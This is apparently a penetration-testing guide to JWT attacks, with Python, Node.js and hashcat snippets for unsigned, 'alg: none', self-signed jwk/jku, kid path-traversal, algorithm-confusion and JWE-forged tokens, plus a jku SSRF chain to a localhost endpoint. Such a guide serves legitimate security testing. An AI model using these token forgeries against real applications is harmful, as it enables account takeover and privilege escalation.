---
description: A practical guide for testing JSON Web Tokens (JWT)
---

# JWT Attacks

### Token Discovery

Find where tokens are used in the application:

* `Authorization: Bearer <token>` headers
* Cookie values (`session`, `token`, `jwt`, etc.)
* URL parameters
* Request bodies

Determine how the token is transmitted and capture a valid, signed JWT.

***

### Token Inspection

Decode the token and inspect all three parts:

```
header.payload.signature
```

Check the header for:

* `alg` — signing algorithm (`HS256`, `RS256`, `none`, etc.)
* `kid` — key ID
* `jwk` — embedded JSON Web Key
* `jku` — JWK Set URL
* `x5c` — X.509 certificate chain
* `cty` — content type

Check the payload for sensitive claims:

* `sub`, `username`, `email`
* `role`, `isAdmin`
* `iat`, `exp`, `aud`, `iss`

Confirm the signature exists and is non-empty.

> The payload is only Base64url-encoded, not encrypted. Anyone can read it.

***

### Signature Verification Bypass

#### Missing signature verification

* Modify a claim such as `sub`, `username`, `role`, or `isAdmin`.
* Leave the original signature unchanged.
* Resend the request.
* If the server accepts the modified token, the application likely uses `decode()` instead of `verify()`.

Example in Python:

```python
import jwt, base64, json

token = "eyJ..."
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['sub'] = 'administrator'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{parts[0]}.{new_payload}.{parts[2]}"
```

#### Algorithm `none`

* Decode the header.
* Change `alg` to `none`.
* Modify the payload as desired.
* Re-encode the header and payload.
* Keep the trailing dot to preserve the `header.payload.` structure.

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

If the string `none` is blocked, try variants:

* `None`, `NONE`, `nOnE`
* Unexpected whitespace or encoding differences

#### Expected impact

* Account takeover by changing user identifier claims
* Privilege escalation by changing `role` or `isAdmin`
* Session extension or replay by tampering with time claims

***

### Weak Secret Recovery

Use this section when the token is signed with a symmetric algorithm (`HS*`).

Check whether the secret could be weak, default, or copied from documentation. Then run one of the following tools.

#### hashcat

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

Show previously cracked secrets without re-running:

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist> --show
```

#### flask-unsign

Useful for Flask sessions that are JWT-like:

```bash
flask-unsign --decode --cookie "eyJ..."
flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
```

If no wordlist works, assess whether a short secret can be brute-forced character by character.

After recovering the secret, re-sign a modified token with `HS256` and confirm acceptance.

***

### Header Injection

#### Embedded JWK (`jwk`)

Use when the token header contains a `jwk` parameter.

* Generate a new RSA key pair.
* Modify the payload, for example change `role` to `administrator`.
* Sign the token with your private key.
* Embed your public key in the `jwk` header.
* Ensure the `kid` in the header matches the `kid` in the embedded JWK.
* Send the forged token and verify acceptance.

Example in Python:

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64

private_key = rsa.generate_private_key(65537, 2048, default_backend())
public_numbers = private_key.public_key().public_numbers()

jwk = {
    "kty": "RSA",
    "kid": original_header['kid'],
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
}
forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
```

> Burp JWT Editor can automate this via **Attack → Embedded JWK**.

#### External JWK Set (`jku`)

Use when the token header contains a `jku` parameter.

* Host a JWK Set containing your public key on a server you control.
* Modify the payload.
* Sign the token with your private key.
* Set `jku` to your hosted JWK Set URL.
* Send the forged token.
* If `jku` hosts are restricted, test for URL parsing discrepancies, open redirects, or SSRF-like bypasses.

Example JWK Set:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
      "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
    }
  ]
}
```

#### `jku` SSRF → Localhost Verification Bypass

The `jku` header can trigger SSRF to localhost-only endpoints. If the server performs side effects during key fetching (such as account verification), point `jku` to that endpoint.

Chain:

* Generate an RSA key pair.
* Forge a JWT with `jku` pointing to a localhost verification endpoint:

```python
header = {
    "alg": "RS256",
    "jku": "http://127.0.0.1:10000/api/verify_user_account?username=targetuser",
    "kid": "my-key",
    "typ": "JWT"
}
payload = {"sub": "targetuser", "verified": "true"}
```

* Sign with your private key.
* Server validates JWT → fetches `jku` URL → triggers account verification → accepts token.
* Verified account may unlock privileged endpoints.

> Even if external `jku` URLs are blocked, localhost endpoints with side effects may still be reachable.

#### Key ID (`kid`) abuse

Use when the server selects keys based on `kid`.

* Check whether `kid` is used as a filesystem path.
* Test path traversal:

```json
{
  "alg": "HS256",
  "kid": "../../path/to/file"
}
```

* Try pointing `kid` to `/dev/null` and signing with an empty string.

```python
forged = jwt.encode(
    {"sub": "administrator"},
    '',
    algorithm='HS256',
    headers={"kid": "../../../dev/null"}
)
```

* Try predictable file contents such as `../../../proc/sys/kernel/hostname`.
* Test `kid` for SQL injection if it is used in a database lookup.

#### Other header parameters

* Check for `x5c` and test self-signed certificate injection.
* If signature verification is bypassable, test `cty` pivots:
  * `text/xml` → XXE
  * `application/x-java-serialized-object` → deserialization

***

### Algorithm Confusion

Use this section when the token uses an asymmetric algorithm such as `RS256`.

* Capture a legitimate JWT and confirm `alg` is `RS256`.
* Obtain the server's public key from a JWK Set, certificate, or metadata endpoint.
* Modify the payload as desired.
* Change the header `alg` to `HS256`.
* Sign the token using the server's public key as the HMAC secret.
* Send the forged token.
* If the server accepts it, algorithm confusion is present.

Example in Node.js:

```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

#### Preconditions

* The server reads the `alg` header from the token.
* The same key material is used for both asymmetric and symmetric verification.
* The public key is available to the attacker.
* The verification library allows HMAC verification with an RSA public key.

***

### Business Logic Attacks

#### JWT Balance Replay (MetaShop Pattern)

Use when the token contains mutable state such as a balance, points, or credits.

* Sign up and capture the initial JWT with a high balance.
* Spend the balance until it reaches zero.
* Replace the current cookie with the saved JWT.
* Return or refund items and observe whether the server recalculates the balance from the token without cross-checking history.
* Repeat until the balance exceeds the target price.

> The server trusts the balance in the JWT for return calculations but does not validate purchase history.

***

### JWE Token Forgery

Use when the application uses JWE (JSON Web Encryption) instead of JWT. JWE tokens have five Base64url segments:

```
header.encrypted_key.iv.ciphertext.tag
```

If the server's public RSA key is exposed (via `/api/key`, `.well-known/jwks.json`, or page source), you can encrypt arbitrary claims that the server will trust after decryption.

Example in Python:

```python
from jwcrypto import jwk, jwe
import json

public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkq...
-----END PUBLIC KEY-----"""

key = jwk.JWK.from_pem(public_key_pem.encode())
forged_claims = {
    "sub": "attacker",
    "balance": 999999,
    "role": "admin"
}

token = jwe.JWE(
    json.dumps(forged_claims).encode(),
    recipient=key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A256GCM"
    })
)
forged_jwe = token.serialize(compact=True)
```

* Fetch the exposed public key.
* Forge claims.
* Encrypt with the public key.
* Send the JWE token as cookie or header.
* Confirm the server decrypts and accepts the forged claims.

> JWE encryption does not equal authentication. If the server trusts any token it can decrypt, exposing the public key allows arbitrary claim forgery.

***

### End-to-End Attack Flows

#### Account takeover via missing verification

* Log in as a low-privilege user and capture the JWT.
* Identify the user identifier claim (`sub`, `username`, etc.).
* Change the claim to a target user.
* Keep the original signature.
* Send the token and confirm access as the target user.

#### Privilege escalation via `alg: none`

* Capture a legitimate JWT.
* Change `alg` to `none`.
* Modify the payload to elevate privileges.
* Re-encode and append a trailing dot.
* Send the token and confirm elevated access.

#### Secret recovery and re-signing

* Capture a valid `HS256` JWT.
* Run hashcat:

```bash
hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
```

* Recover the secret.
* Modify the payload.
* Re-sign with `HS256` using the recovered secret.
* Confirm the server accepts the re-signed token.

#### Self-signed JWT via `jwk`

* Generate an RSA key pair.
* Modify the payload.
* Sign with your private key.
* Embed your public key in the `jwk` header.
* Match `kid` between header and embedded JWK.
* Send and confirm acceptance.

#### Self-signed JWT via `jku`

* Generate an RSA key pair.
* Host a JWK Set with your public key.
* Modify the payload.
* Set `jku` to your hosted JWK Set.
* Sign with your private key.
* Send and confirm acceptance.

#### `jku` SSRF → localhost verification bypass

* Generate an RSA key pair.
* Find a localhost endpoint with side effects such as account verification.
* Forge a JWT with `jku` pointing to that endpoint.
* Sign with your private key.
* Send and confirm the side effect triggers and the token is accepted.

#### `kid` path traversal

* Capture an `HS256` JWT.
* Set `kid` to `/dev/null` or another known file path.
* Modify the payload.
* Sign with the file contents as the secret.
* Send and confirm acceptance.

#### RS256 to HS256 confusion

* Capture an `RS256` JWT.
* Obtain the server's public key.
* Modify the payload.
* Change `alg` to `HS256`.
* Sign with the public key as the HMAC secret.
* Send and confirm acceptance.

#### JWE token forgery

* Identify a JWE token (five dot-separated segments).
* Locate the exposed public key.
* Forge claims.
* Encrypt with the public key.
* Send and confirm acceptance.

***

### Tools

| Tool                                | Purpose                                                    |
| ----------------------------------- | ---------------------------------------------------------- |
| Burp Suite + JWT Editor             | Modify, re-sign, and inject JWTs                           |
| Burp Repeater                       | Replay requests with modified tokens                       |
| hashcat                             | Offline brute-force of HMAC secrets (`-m 16500`)           |
| flask-unsign                        | Decode and brute-force Flask session cookies               |
| jwt.io debugger                     | Manual encoding and decoding                               |
| Python `jwt` / `jwcrypto` libraries | Scripted token forging and JWE encryption                  |
| Python `requests`                   | Scripted automation (route through Burp proxy for logging) |

***

_Use this guide during web application penetration tests, CTF challenges, code reviews, and secure-design sessions. Attach evidence for each confirmed finding._
